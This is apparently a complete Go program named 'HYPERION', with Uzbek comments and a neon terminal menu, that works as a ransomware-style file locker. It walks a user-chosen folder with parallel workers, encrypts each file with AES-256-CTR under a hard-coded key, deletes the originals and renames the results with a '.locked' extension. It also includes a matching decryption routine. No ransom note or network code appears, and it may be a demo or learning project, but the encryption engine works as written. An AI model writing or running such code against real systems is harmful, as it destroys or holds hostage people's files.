package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
)

// 🩸 CRIMSON NEON DESIGN PALITRASI
const (
	Reset       = "\033[0m"
	Bold        = "\033[1m"
	CrimsonRed  = "\033[38;5;196m"
	BloodWine   = "\033[38;5;124m"
	BrightJade  = "\033[38;5;49m"
	ElectricV   = "\033[38;5;129m"
	GoldYellow  = "\033[38;5;220m"
	DarkGray    = "\033[38;5;240m"
	GhostGray   = "\033[38;5;244m"
	CyberWhite  = "\033[38;5;255m"
)

// 32-baytli AES-256 master kaliti
var secretKey = []byte("CRYPTO_HYPERION_KEY_2026_MASTER!")

func init() {
	numCPU := runtime.NumCPU()
	if numCPU > 1 {
		runtime.GOMAXPROCS(numCPU - 1)
	} else {
		runtime.GOMAXPROCS(1)
	}

	var rLimit syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit); err == nil {
		rLimit.Cur = 65535
		rLimit.Max = 65535
		syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	}
}

// STREAM SHIFRLASH: Faylni 32KB lik bloklarda oqimli shifrlaydi (RAM yemasdan luboy hajmni ko'taradi)
func encryptFileStream(src string) error {
	inFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer inFile.Close()

	// Soxta vaqtinchalik fayl yaratamiz
	tmpDst := src + ".tmp"
	outFile, err := os.Create(tmpDst)
	if err != nil {
		return err
	}
	defer outFile.Close()

	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return err
	}

	// Har bir fayl uchun takrorlanmas soxta tasodifiy IV (Initialization Vector) blok yaratamiz
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	// IV blokini shifrlangan faylning eng boshiga yozib qo'yamiz (Decrypter o'qishi uchun)
	if _, err := outFile.Write(iv); err != nil {
		return err
	}

	// AES-CTR (Counter mode) oqimli shifrlagichni yoqamiz
	stream := cipher.NewCTR(block, iv)
	writer := &cipher.StreamWriter{S: stream, W: outFile}

	// 32KB lik kichik bufer quvuri orqali luboy hajmdagi faylni oqizib shifrlaymiz
	buf := make([]byte, 32*1024)
	if _, err := io.CopyBuffer(writer, inFile, buf); err != nil {
		os.Remove(tmpDst)
		return err
	}

	inFile.Close()
	outFile.Close()

	// Asl faylni o'chirib, shifrlangan vaqtinchalik faylni .locked kengaytmasiga o'tkazamiz
	os.Remove(src)
	return os.Rename(tmpDst, src+".locked")
}

// STREAM DECRYPT: Shifrlangan har qanday ulkan faylni oqimli ochib beradi
func decryptFileStream(src string) error {
	if !strings.HasSuffix(src, ".locked") {
		return nil
	}

	inFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer inFile.Close()

	tmpDst := strings.TrimSuffix(src, ".locked") + ".tmp"
	outFile, err := os.Create(tmpDst)
	if err != nil {
		return err
	}
	defer outFile.Close()

	block, err := aes.NewCipher(secretKey)
	if err != nil {
		return err
	}

	// Fayl boshida turgan IV blokini o'qiymiz
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(inFile, iv); err != nil {
		return err
	}

	stream := cipher.NewCTR(block, iv)
	reader := &cipher.StreamReader{S: stream, R: inFile}

	buf := make([]byte, 32*1024)
	if _, err := io.CopyBuffer(outFile, reader, buf); err != nil {
		os.Remove(tmpDst)
		return err
	}

	inFile.Close()
	outFile.Close()

	os.Remove(src)
	return os.Rename(tmpDst, strings.TrimSuffix(src, ".locked"))
}

func printBanner() {
	fmt.Print("\033[H\033[2J") 
	fmt.Printf("%s%s", CrimsonRed, Bold)
	fmt.Println("██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ██╗ ██████╗ ███╗   ██╗")
	fmt.Println("██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║██╔═══██╗████╗  ██║")
	fmt.Println("███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║██║   ██║██╔██╗ ██║")
	fmt.Println("██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██║██║   ██║██║╚██╗██║")
	fmt.Println("██║  ██║   ██║   ██║     ███████╗██║  ██║██║╚██████╔╝██║ ╚████║")
	fmt.Println("╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝")
	fmt.Printf("             %s[ V3.0 - ULTRA STREAM ENGINE ACTIVE ]%s\n\n", ElectricV, Reset)
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	for {
		printBanner()

		fmt.Printf("%s┌───[ CYBER ENGINE CORES ENGINE ]────────────────────┐%s\n", BloodWine, Reset)
		fmt.Printf("%s│%s  FAYLLARNI SHIFRLASH (LAUNCH ENCRYPTION)       %s│%s\n", BloodWine, BrightJade, BloodWine, Reset)
		fmt.Printf("%s│%s  FAYLLARNI QAYTA TIKLASH (LAUNCH DECRYPTION)   %s│%s\n", BloodWine, GoldYellow, BloodWine, Reset)
		fmt.Printf("%s│%s  SESHINDAN TO'LIQ CHIQISH (EXIT ENGINE)        %s│%s\n", BloodWine, CrimsonRed, BloodWine, Reset)
		fmt.Printf("%s└────────────────────────────────────────────────────┘%s\n\n", BloodWine, Reset)

		fmt.Printf("%s┌── %sAmalni tanlang%s:\n%s└── %s» %s", BloodWine, CyberWhite, BloodWine, BloodWine, CrimsonRed, Reset)
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)

		if choice == "3" {
			fmt.Printf("\n%s[*] Kiber-tizim o'chirilmoqda. Sog' bo'ling!%s\n", GoldYellow, Reset)
			break
		}

		if choice != "1" && choice != "2" {
			fmt.Printf("%s[!] Noto'g'ri tanlov! Qayta urinib ko'ring.%s\n", CrimsonRed, Reset)
			continue
		}

		var mode string
		if choice == "1" {
			mode = "encrypt"
		} else {
			mode = "decrypt"
		}

		fmt.Printf("\n%s┌── %sNishon papka nomini kiriting [Standart: test_files]%s:\n%s└── %s» %s", BloodWine, CyberWhite, BloodWine, BloodWine, CrimsonRed, Reset)
		dirInput, _ := reader.ReadString('\n')
		dirInput = strings.TrimSpace(dirInput)
		if dirInput == "" {
			dirInput = "test_files"
		}

		absTargetDir, err := filepath.Abs(dirInput)
		if err != nil {
			fmt.Printf("%s[!] Xatolik: Manzil aniqlanmadi: %v%s\n", CrimsonRed, err, Reset)
			continue
		}

		if _, err := os.Stat(absTargetDir); os.IsNotExist(err) {
			fmt.Printf("%s[XATO] Kiritilgan papka topilmadi!%s\n", CrimsonRed, Reset)
			fmt.Println("Davom etish uchun [Enter] bosing...")
			reader.ReadString('\n')
			continue
		}

		printBanner()
		fmt.Printf("%s┌───[ OPERATSIYA PARAMETRLARI ]─────────────────────┐%s\n", BloodWine, Reset)
		fmt.Printf("%s│%s Rejim     %s=> %s%s\n", BloodWine, ElectricV, DarkGray, Reset, strings.ToUpper(mode))
		fmt.Printf("%s│%s Nishon    %s=> %s%s\n", BloodWine, ElectricV, DarkGray, Reset, absTargetDir)
		fmt.Printf("%s│%s Workers   %s=> %s%d Parallel Threads\n", BloodWine, ElectricV, DarkGray, Reset, runtime.GOMAXPROCS(0))
		fmt.Printf("%s└────────────────────────────────────────────────────┘%s\n\n", BloodWine, Reset)

		var files []string
		filepath.WalkDir(absTargetDir, func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				return err
			}
			if !d.IsDir() {
				name := d.Name()
				if name != "main.go" && name != "run_crypto.sh" && !strings.HasPrefix(name, ".") {
					files = append(files, path)
				}
			}
			return nil
		})

		totalFiles := len(files)
		if totalFiles == 0 {
			fmt.Printf("%s[!] Eslatma: Belgilangan papka ichida shifrlanadigan fayllar topilmadi.%s\n", GoldYellow, Reset)
			fmt.Println("\nDavom etish uchun [Enter] bosing...")
			reader.ReadString('\n')
			continue
		}

		jobs := make(chan string, totalFiles)
		var wg sync.WaitGroup

		workerCount := 10
		if totalFiles < workerCount {
			workerCount = totalFiles
		}

		for w := 1; w <= workerCount; w++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for path := range jobs {
					if mode == "encrypt" {
						if !strings.HasSuffix(path, ".locked") {
							err := encryptFileStream(path)
							if err != nil {
								fmt.Printf("%s[XATO]%s %s -> %v\n", CrimsonRed, Reset, filepath.Base(path), err)
							} else {
								fmt.Printf("%s[SHIFRLANDI]%s ───> %s\n", CrimsonRed, Reset, filepath.Base(path))
							}
						}
					} else if mode == "decrypt" {
						if strings.HasSuffix(path, ".locked") {
							err := decryptFileStream(path)
							if err != nil {
								fmt.Printf("%s[XATO]%s %s -> %v\n", CrimsonRed, Reset, filepath.Base(path), err)
							} else {
								fmt.Printf("%s[TIKLANDI]%s   ───> %s\n", BrightJade, Reset, filepath.Base(strings.TrimSuffix(path, ".locked")))
							}
						}
					}
				}
			}()
		}

		for _, path := range files {
			jobs <- path
		}
		close(jobs)
		wg.Wait()

		fmt.Printf("\n%s[+] OPERATSIYA YAKUNLANDI!%s\n", BrightJade, Reset)
		fmt.Printf("%s[*] Asosiy menyuga qaytish uchun [Enter] bosing...%s", GhostGray, Reset)
		reader.ReadString('\n')
	}
}
